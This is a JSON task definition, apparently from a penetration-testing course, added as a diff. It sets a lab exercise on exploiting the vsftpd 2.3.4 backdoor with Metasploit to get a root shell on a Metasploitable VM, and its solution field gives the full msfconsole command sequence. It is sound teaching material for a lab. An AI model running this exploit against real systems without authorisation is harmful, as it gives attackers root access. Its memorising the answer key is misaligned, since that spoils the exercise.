@@ -1,0 +1,14 @@
+{
+    "id": "task1",
+    "chapterId": "ch_7",
+    "title": "Exploit vsftpd with Metasploit",
+    "description": "Use Metasploit to gain a root shell via vsftpd backdoor.",
+    "estimatedMinutes": 25,
+    "problemStatement": "# Objective\nGain a root shell on the Metasploitable VM by exploiting the vsftpd 2.3.4 backdoor using Metasploit.\n\n## Steps\n1.  Ensure Metasploitable VM is running and reachable from Kali.\n2.  Launch `msfconsole`.\n3.  Search for the `vsftpd` exploit module.\n4.  Select the module and set the `RHOSTS` option to the Metasploitable IP address.\n5.  Run the `check` command to confirm vulnerability.\n6.  Execute the exploit (`run` or `exploit`).\n7.  Once you have a shell, run the `whoami` and `id` commands to verify root access.\n8.  Background the session with `Ctrl+Z`.\n\n## Deliverable\nScreenshot or text showing the output of `whoami` returning `root`.",
+    "hints": [
+        "Module: `exploit/unix/ftp/vsftpd_234_backdoor`",
+        "Default port 21 is already set."
+    ],
+    "expectedOutput": "A root shell prompt with `uid=0(root)`.",
+    "solutionCode": "msf6 > search vsftpd\nmsf6 > use 0\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.101\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) > check\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit\nwhoami\nid\n# Press Ctrl+Z to background session"
+}
